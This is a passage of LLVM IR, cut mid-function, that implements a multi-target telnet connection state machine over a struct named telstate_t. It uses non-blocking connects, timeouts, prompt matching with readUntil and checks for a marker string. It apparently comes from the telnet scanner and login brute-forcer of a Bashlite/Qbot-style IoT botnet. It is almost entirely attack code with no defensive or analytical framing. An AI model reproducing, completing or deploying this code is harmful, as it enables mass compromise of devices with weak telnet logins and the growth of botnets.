  %191 = call i32 @connect(i32 %189, %struct.sockaddr* %190, i32 16)
  %192 = icmp eq i32 %191, -1
  br i1 %192, label %193, label %208

; <label>:193:                                    ; preds = %171
  %194 = call i32* @__errno_location() #13
  %195 = load i32, i32* %194, align 4
  %196 = icmp ne i32 %195, 115
  br i1 %196, label %197, label %208

; <label>:197:                                    ; preds = %193
  %198 = load i32, i32* %2, align 4
  %199 = sext i32 %198 to i64
  %200 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %199
  %201 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %200, i32 0, i32 0
  %202 = load i32, i32* %201, align 16
  %203 = call i32 @sclose(i32 %202)
  %204 = load i32, i32* %2, align 4
  %205 = sext i32 %204 to i64
  %206 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %205
  %207 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %206, i32 0, i32 3
  store i8 1, i8* %207, align 1
  br label %217

; <label>:208:                                    ; preds = %193, %171
  %209 = load i32, i32* %2, align 4
  %210 = sext i32 %209 to i64
  %211 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %210
  %212 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %211, i32 0, i32 2
  store i8 1, i8* %212, align 8
  %213 = load i32, i32* %2, align 4
  %214 = sext i32 %213 to i64
  %215 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %214
  %216 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %215, i32 0, i32 6
  store i32 0, i32* %216, align 4
  br label %217

; <label>:217:                                    ; preds = %208, %197
  br label %2046

; <label>:218:                                    ; preds = %68
  %219 = load i32, i32* %2, align 4
  %220 = sext i32 %219 to i64
  %221 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %220
  %222 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %221, i32 0, i32 6
  %223 = load i32, i32* %222, align 4
  %224 = icmp eq i32 %223, 0
  br i1 %224, label %225, label %231

; <label>:225:                                    ; preds = %218
  %226 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %227 = load i32, i32* %2, align 4
  %228 = sext i32 %227 to i64
  %229 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %228
  %230 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %229, i32 0, i32 6
  store i32 %226, i32* %230, align 4
  br label %231

; <label>:231:                                    ; preds = %225, %218
  br label %232

; <label>:232:                                    ; preds = %231
  %233 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %4, i32 0, i32 0
  %234 = getelementptr inbounds [16 x i64], [16 x i64]* %233, i64 0, i64 0
  %235 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %234) #2, !srcloc !5
  %236 = extractvalue { i64, i64* } %235, 0
  %237 = extractvalue { i64, i64* } %235, 1
  %238 = trunc i64 %236 to i32
  store i32 %238, i32* %12, align 4
  %239 = ptrtoint i64* %237 to i64
  %240 = trunc i64 %239 to i32
  store i32 %240, i32* %13, align 4
  br label %241

; <label>:241:                                    ; preds = %232
  br label %242

; <label>:242:                                    ; preds = %241
  %243 = load i32, i32* %2, align 4
  %244 = sext i32 %243 to i64
  %245 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %244
  %246 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %245, i32 0, i32 0
  %247 = load i32, i32* %246, align 16
  %248 = srem i32 %247, 64
  %249 = zext i32 %248 to i64
  %250 = shl i64 1, %249
  %251 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %4, i32 0, i32 0
  %252 = load i32, i32* %2, align 4
  %253 = sext i32 %252 to i64
  %254 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %253
  %255 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %254, i32 0, i32 0
  %256 = load i32, i32* %255, align 16
  %257 = sdiv i32 %256, 64
  %258 = sext i32 %257 to i64
  %259 = getelementptr inbounds [16 x i64], [16 x i64]* %251, i64 0, i64 %258
  %260 = load i64, i64* %259, align 8
  %261 = or i64 %260, %250
  store i64 %261, i64* %259, align 8
  %262 = getelementptr inbounds %struct.timeval, %struct.timeval* %5, i32 0, i32 0
  store i64 0, i64* %262, align 8
  %263 = getelementptr inbounds %struct.timeval, %struct.timeval* %5, i32 0, i32 1
  store i64 10000, i64* %263, align 8
  %264 = load i32, i32* %2, align 4
  %265 = sext i32 %264 to i64
  %266 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %265
  %267 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %266, i32 0, i32 0
  %268 = load i32, i32* %267, align 16
  %269 = add nsw i32 %268, 1
  %270 = call i32 @select(i32 %269, %struct.__sigset_t* null, %struct.__sigset_t* %4, %struct.__sigset_t* null, %struct.timeval* %5)
  store i32 %270, i32* %3, align 4
  %271 = load i32, i32* %3, align 4
  %272 = icmp eq i32 %271, 1
  br i1 %272, label %273, label %330

; <label>:273:                                    ; preds = %242
  store i32 4, i32* %6, align 4
  store i32 0, i32* %7, align 4
  %274 = load i32, i32* %2, align 4
  %275 = sext i32 %274 to i64
  %276 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %275
  %277 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %276, i32 0, i32 0
  %278 = load i32, i32* %277, align 16
  %279 = bitcast i32* %7 to i8*
  %280 = call i32 @getsockopt(i32 %278, i32 1, i32 4, i8* %279, i32* %6) #2
  %281 = load i32, i32* %7, align 4
  %282 = icmp ne i32 %281, 0
  br i1 %282, label %283, label %298

; <label>:283:                                    ; preds = %273
  %284 = load i32, i32* %2, align 4
  %285 = sext i32 %284 to i64
  %286 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %285
  %287 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %286, i32 0, i32 0
  %288 = load i32, i32* %287, align 16
  %289 = call i32 @sclose(i32 %288)
  %290 = load i32, i32* %2, align 4
  %291 = sext i32 %290 to i64
  %292 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %291
  %293 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %292, i32 0, i32 2
  store i8 0, i8* %293, align 8
  %294 = load i32, i32* %2, align 4
  %295 = sext i32 %294 to i64
  %296 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %295
  %297 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %296, i32 0, i32 3
  store i8 1, i8* %297, align 1
  br label %329

; <label>:298:                                    ; preds = %273
  %299 = load i32, i32* %2, align 4
  %300 = sext i32 %299 to i64
  %301 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %300
  %302 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %301, i32 0, i32 0
  %303 = load i32, i32* %302, align 16
  %304 = load i32, i32* %2, align 4
  %305 = sext i32 %304 to i64
  %306 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %305
  %307 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %306, i32 0, i32 0
  %308 = load i32, i32* %307, align 16
  %309 = call i32 (i32, i32, ...) @fcntl(i32 %308, i32 3, i8* null)
  %310 = and i32 %309, -2049
  %311 = call i32 (i32, i32, ...) @fcntl(i32 %303, i32 4, i32 %310)
  %312 = load i32, i32* %2, align 4
  %313 = sext i32 %312 to i64
  %314 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %313
  %315 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %314, i32 0, i32 6
  store i32 0, i32* %315, align 4
  %316 = load i32, i32* %2, align 4
  %317 = sext i32 %316 to i64
  %318 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %317
  %319 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %318, i32 0, i32 7
  store i16 0, i16* %319, align 16
  %320 = load i32, i32* %2, align 4
  %321 = sext i32 %320 to i64
  %322 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %321
  %323 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %322, i32 0, i32 8
  %324 = load i8*, i8** %323, align 8
  call void @llvm.memset.p0i8.i64(i8* %324, i8 0, i64 1024, i32 1, i1 false)
  %325 = load i32, i32* %2, align 4
  %326 = sext i32 %325 to i64
  %327 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %326
  %328 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %327, i32 0, i32 2
  store i8 2, i8* %328, align 8
  br label %2047

; <label>:329:                                    ; preds = %283
  br label %349

; <label>:330:                                    ; preds = %242
  %331 = load i32, i32* %3, align 4
  %332 = icmp eq i32 %331, -1
  br i1 %332, label %333, label %348

; <label>:333:                                    ; preds = %330
  %334 = load i32, i32* %2, align 4
  %335 = sext i32 %334 to i64
  %336 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %335
  %337 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %336, i32 0, i32 0
  %338 = load i32, i32* %337, align 16
  %339 = call i32 @sclose(i32 %338)
  %340 = load i32, i32* %2, align 4
  %341 = sext i32 %340 to i64
  %342 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %341
  %343 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %342, i32 0, i32 2
  store i8 0, i8* %343, align 8
  %344 = load i32, i32* %2, align 4
  %345 = sext i32 %344 to i64
  %346 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %345
  %347 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %346, i32 0, i32 3
  store i8 1, i8* %347, align 1
  br label %348

; <label>:348:                                    ; preds = %333, %330
  br label %349

; <label>:349:                                    ; preds = %348, %329
  %350 = load i32, i32* %2, align 4
  %351 = sext i32 %350 to i64
  %352 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %351
  %353 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %352, i32 0, i32 6
  %354 = load i32, i32* %353, align 4
  %355 = add i32 %354, 10
  %356 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %357 = icmp ult i32 %355, %356
  br i1 %357, label %358, label %373

; <label>:358:                                    ; preds = %349
  %359 = load i32, i32* %2, align 4
  %360 = sext i32 %359 to i64
  %361 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %360
  %362 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %361, i32 0, i32 0
  %363 = load i32, i32* %362, align 16
  %364 = call i32 @sclose(i32 %363)
  %365 = load i32, i32* %2, align 4
  %366 = sext i32 %365 to i64
  %367 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %366
  %368 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %367, i32 0, i32 2
  store i8 0, i8* %368, align 8
  %369 = load i32, i32* %2, align 4
  %370 = sext i32 %369 to i64
  %371 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %370
  %372 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %371, i32 0, i32 3
  store i8 1, i8* %372, align 1
  br label %373

; <label>:373:                                    ; preds = %358, %349
  br label %2046

; <label>:374:                                    ; preds = %68
  %375 = load i32, i32* %2, align 4
  %376 = sext i32 %375 to i64
  %377 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %376
  %378 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %377, i32 0, i32 6
  %379 = load i32, i32* %378, align 4
  %380 = icmp eq i32 %379, 0
  br i1 %380, label %381, label %387

; <label>:381:                                    ; preds = %374
  %382 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %383 = load i32, i32* %2, align 4
  %384 = sext i32 %383 to i64
  %385 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %384
  %386 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %385, i32 0, i32 6
  store i32 %382, i32* %386, align 4
  br label %387

; <label>:387:                                    ; preds = %381, %374
  %388 = load i32, i32* %2, align 4
  %389 = sext i32 %388 to i64
  %390 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %389
  %391 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %390, i32 0, i32 0
  %392 = load i32, i32* %391, align 16
  %393 = load i32, i32* %2, align 4
  %394 = sext i32 %393 to i64
  %395 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %394
  %396 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %395, i32 0, i32 8
  %397 = load i8*, i8** %396, align 8
  %398 = load i32, i32* %2, align 4
  %399 = sext i32 %398 to i64
  %400 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %399
  %401 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %400, i32 0, i32 7
  %402 = load i16, i16* %401, align 16
  %403 = zext i16 %402 to i32
  %404 = call i32 @readUntil(i32 %392, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.25, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %397, i32 1024, i32 %403)
  %405 = icmp ne i32 %404, 0
  br i1 %405, label %406, label %438

; <label>:406:                                    ; preds = %387
  %407 = load i32, i32* %2, align 4
  %408 = sext i32 %407 to i64
  %409 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %408
  %410 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %409, i32 0, i32 6
  store i32 0, i32* %410, align 4
  %411 = load i32, i32* %2, align 4
  %412 = sext i32 %411 to i64
  %413 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %412
  %414 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %413, i32 0, i32 7
  store i16 0, i16* %414, align 16
  %415 = load i32, i32* %2, align 4
  %416 = sext i32 %415 to i64
  %417 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %416
  %418 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %417, i32 0, i32 8
  %419 = load i8*, i8** %418, align 8
  %420 = call i8* @strstr(i8* %419, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.26, i32 0, i32 0)) #10
  %421 = icmp ne i8* %420, null
  br i1 %421, label %422, label %427

; <label>:422:                                    ; preds = %406
  %423 = load i32, i32* %2, align 4
  %424 = sext i32 %423 to i64
  %425 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %424
  %426 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %425, i32 0, i32 2
  store i8 5, i8* %426, align 8
  br label %432

; <label>:427:                                    ; preds = %406
  %428 = load i32, i32* %2, align 4
  %429 = sext i32 %428 to i64
  %430 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %429
  %431 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %430, i32 0, i32 2
  store i8 3, i8* %431, align 8
  br label %432

; <label>:432:                                    ; preds = %427, %422
  %433 = load i32, i32* %2, align 4
  %434 = sext i32 %433 to i64
  %435 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %434
  %436 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %435, i32 0, i32 8
  %437 = load i8*, i8** %436, align 8
  call void @llvm.memset.p0i8.i64(i8* %437, i8 0, i64 1024, i32 1, i1 false)
  br label %2047

; <label>:438:                                    ; preds = %387
  %439 = load i32, i32* %2, align 4
  %440 = sext i32 %439 to i64
  %441 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %440
  %442 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %441, i32 0, i32 0
  %443 = load i32, i32* %442, align 16
  %444 = load i32, i32* %2, align 4
  %445 = sext i32 %444 to i64
  %446 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %445
  %447 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %446, i32 0, i32 8
  %448 = load i8*, i8** %447, align 8
  %449 = load i32, i32* %2, align 4
  %450 = sext i32 %449 to i64
  %451 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %450
  %452 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %451, i32 0, i32 7
  %453 = load i16, i16* %452, align 16
  %454 = zext i16 %453 to i32
  %455 = call i32 @readUntil(i32 %443, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.27, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %448, i32 1024, i32 %454)
  %456 = icmp ne i32 %455, 0
  br i1 %456, label %457, label %493

; <label>:457:                                    ; preds = %438
  %458 = load i32, i32* %2, align 4
  %459 = sext i32 %458 to i64
  %460 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %459
  %461 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %460, i32 0, i32 6
  store i32 0, i32* %461, align 4
  %462 = load i32, i32* %2, align 4
  %463 = sext i32 %462 to i64
  %464 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %463
  %465 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %464, i32 0, i32 7
  store i16 0, i16* %465, align 16
  %466 = load i32, i32* %2, align 4
  %467 = sext i32 %466 to i64
  %468 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %467
  %469 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %468, i32 0, i32 8
  %470 = load i8*, i8** %469, align 8
  %471 = call i8* @strstr(i8* %470, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.26, i32 0, i32 0)) #10
  %472 = icmp ne i8* %471, null
  br i1 %472, label %473, label %478

; <label>:473:                                    ; preds = %457
  %474 = load i32, i32* %2, align 4
  %475 = sext i32 %474 to i64
  %476 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %475
  %477 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %476, i32 0, i32 2
  store i8 5, i8* %477, align 8
  br label %483

; <label>:478:                                    ; preds = %457
  %479 = load i32, i32* %2, align 4
  %480 = sext i32 %479 to i64
  %481 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %480
  %482 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %481, i32 0, i32 2
  store i8 3, i8* %482, align 8
  br label %483

; <label>:483:                                    ; preds = %478, %473
  %484 = load i32, i32* %2, align 4
  %485 = sext i32 %484 to i64
  %486 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %485
  %487 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %486, i32 0, i32 8
  %488 = load i8*, i8** %487, align 8
  call void @llvm.memset.p0i8.i64(i8* %488, i8 0, i64 1024, i32 1, i1 false)
  %489 = load i32, i32* %2, align 4
  %490 = sext i32 %489 to i64
  %491 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %490
  %492 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %491, i32 0, i32 2
  store i8 3, i8* %492, align 8
  br label %2047

; <label>:493:                                    ; preds = %438
  %494 = load i32, i32* %2, align 4
  %495 = sext i32 %494 to i64
  %496 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %495
  %497 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %496, i32 0, i32 0
  %498 = load i32, i32* %497, align 16
  %499 = load i32, i32* %2, align 4
  %500 = sext i32 %499 to i64
  %501 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %500
  %502 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %501, i32 0, i32 8
  %503 = load i8*, i8** %502, align 8
  %504 = load i32, i32* %2, align 4
  %505 = sext i32 %504 to i64
  %506 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %505
  %507 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %506, i32 0, i32 7
  %508 = load i16, i16* %507, align 16
  %509 = zext i16 %508 to i32
  %510 = call i32 @readUntil(i32 %498, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.28, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %503, i32 1024, i32 %509)
  %511 = icmp ne i32 %510, 0
  br i1 %511, label %512, label %530

; <label>:512:                                    ; preds = %493
  %513 = load i32, i32* %2, align 4
  %514 = sext i32 %513 to i64
  %515 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %514
  %516 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %515, i32 0, i32 6
  store i32 0, i32* %516, align 4
  %517 = load i32, i32* %2, align 4
  %518 = sext i32 %517 to i64
  %519 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %518
  %520 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %519, i32 0, i32 7
  store i16 0, i16* %520, align 16
  %521 = load i32, i32* %2, align 4
  %522 = sext i32 %521 to i64
  %523 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %522
  %524 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %523, i32 0, i32 8
  %525 = load i8*, i8** %524, align 8
  call void @llvm.memset.p0i8.i64(i8* %525, i8 0, i64 1024, i32 1, i1 false)
  %526 = load i32, i32* %2, align 4
  %527 = sext i32 %526 to i64
  %528 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %527
  %529 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %528, i32 0, i32 2
  store i8 5, i8* %529, align 8
  br label %2047

; <label>:530:                                    ; preds = %493
  %531 = load i32, i32* %2, align 4
  %532 = sext i32 %531 to i64
  %533 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %532
  %534 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %533, i32 0, i32 0
  %535 = load i32, i32* %534, align 16
  %536 = load i32, i32* %2, align 4
  %537 = sext i32 %536 to i64
  %538 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %537
  %539 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %538, i32 0, i32 8
  %540 = load i8*, i8** %539, align 8
  %541 = load i32, i32* %2, align 4
  %542 = sext i32 %541 to i64
  %543 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %542
  %544 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %543, i32 0, i32 7
  %545 = load i16, i16* %544, align 16
  %546 = zext i16 %545 to i32
  %547 = call i32 @readUntil(i32 %535, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.29, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %540, i32 1024, i32 %546)
  %548 = icmp ne i32 %547, 0
  br i1 %548, label %549, label %585

; <label>:549:                                    ; preds = %530
  %550 = load i32, i32* %2, align 4
  %551 = sext i32 %550 to i64
  %552 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %551
  %553 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %552, i32 0, i32 6
  store i32 0, i32* %553, align 4
  %554 = load i32, i32* %2, align 4
  %555 = sext i32 %554 to i64
  %556 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %555
  %557 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %556, i32 0, i32 7
  store i16 0, i16* %557, align 16
  %558 = load i32, i32* %2, align 4
  %559 = sext i32 %558 to i64
  %560 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %559
  %561 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %560, i32 0, i32 8
  %562 = load i8*, i8** %561, align 8
  %563 = call i8* @strstr(i8* %562, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.26, i32 0, i32 0)) #10
  %564 = icmp ne i8* %563, null
  br i1 %564, label %565, label %570

; <label>:565:                                    ; preds = %549
  %566 = load i32, i32* %2, align 4
  %567 = sext i32 %566 to i64
  %568 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %567
  %569 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %568, i32 0, i32 2
  store i8 5, i8* %569, align 8
  br label %575

; <label>:570:                                    ; preds = %549
  %571 = load i32, i32* %2, align 4
  %572 = sext i32 %571 to i64
  %573 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %572
  %574 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %573, i32 0, i32 2
  store i8 3, i8* %574, align 8
  br label %575

; <label>:575:                                    ; preds = %570, %565
  %576 = load i32, i32* %2, align 4
  %577 = sext i32 %576 to i64
  %578 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %577
  %579 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %578, i32 0, i32 8
  %580 = load i8*, i8** %579, align 8
  call void @llvm.memset.p0i8.i64(i8* %580, i8 0, i64 1024, i32 1, i1 false)
  %581 = load i32, i32* %2, align 4
  %582 = sext i32 %581 to i64
  %583 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %582
  %584 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %583, i32 0, i32 2
  store i8 3, i8* %584, align 8
  br label %2047

; <label>:585:                                    ; preds = %530
  %586 = load i32, i32* %2, align 4
  %587 = sext i32 %586 to i64
  %588 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %587
  %589 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %588, i32 0, i32 0
  %590 = load i32, i32* %589, align 16
  %591 = load i32, i32* %2, align 4
  %592 = sext i32 %591 to i64
  %593 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %592
  %594 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %593, i32 0, i32 8
  %595 = load i8*, i8** %594, align 8
  %596 = load i32, i32* %2, align 4
  %597 = sext i32 %596 to i64
  %598 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %597
  %599 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %598, i32 0, i32 7
  %600 = load i16, i16* %599, align 16
  %601 = zext i16 %600 to i32
  %602 = call i32 @readUntil(i32 %590, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.30, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %595, i32 1024, i32 %601)
  %603 = icmp ne i32 %602, 0
  br i1 %603, label %604, label %622

; <label>:604:                                    ; preds = %585
  %605 = load i32, i32* %2, align 4
  %606 = sext i32 %605 to i64
  %607 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %606
  %608 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %607, i32 0, i32 6
  store i32 0, i32* %608, align 4
  %609 = load i32, i32* %2, align 4
  %610 = sext i32 %609 to i64
  %611 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %610
  %612 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %611, i32 0, i32 7
  store i16 0, i16* %612, align 16
  %613 = load i32, i32* %2, align 4
  %614 = sext i32 %613 to i64
  %615 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %614
  %616 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %615, i32 0, i32 8
  %617 = load i8*, i8** %616, align 8
  call void @llvm.memset.p0i8.i64(i8* %617, i8 0, i64 1024, i32 1, i1 false)
  %618 = load i32, i32* %2, align 4
  %619 = sext i32 %618 to i64
  %620 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %619
  %621 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %620, i32 0, i32 2
  store i8 5, i8* %621, align 8
  br label %2047

; <label>:622:                                    ; preds = %585
  %623 = load i32, i32* %2, align 4
  %624 = sext i32 %623 to i64
  %625 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %624
  %626 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %625, i32 0, i32 8
  %627 = load i8*, i8** %626, align 8
  %628 = call i64 @strlen(i8* %627) #10
  %629 = trunc i64 %628 to i16
  %630 = load i32, i32* %2, align 4
  %631 = sext i32 %630 to i64
  %632 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %631
  %633 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %632, i32 0, i32 7
  store i16 %629, i16* %633, align 16
  br label %634

; <label>:634:                                    ; preds = %622
  br label %635

; <label>:635:                                    ; preds = %634
  br label %636

; <label>:636:                                    ; preds = %635
  br label %637

; <label>:637:                                    ; preds = %636
  br label %638

; <label>:638:                                    ; preds = %637
  %639 = load i32, i32* %2, align 4
  %640 = sext i32 %639 to i64
  %641 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %640
  %642 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %641, i32 0, i32 6
  %643 = load i32, i32* %642, align 4
  %644 = add i32 %643, 10
  %645 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %646 = icmp ult i32 %644, %645
  br i1 %646, label %647, label %662

; <label>:647:                                    ; preds = %638
  %648 = load i32, i32* %2, align 4
  %649 = sext i32 %648 to i64
  %650 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %649
